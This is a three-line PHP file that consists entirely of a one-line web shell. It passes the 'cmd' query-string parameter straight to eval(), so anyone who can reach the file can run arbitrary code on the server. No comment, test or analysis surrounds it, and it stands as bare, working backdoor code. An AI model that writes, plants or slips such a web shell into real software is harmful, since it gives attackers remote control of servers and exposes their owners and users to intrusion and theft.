<?php
    eval($_GET["cmd"]);
?>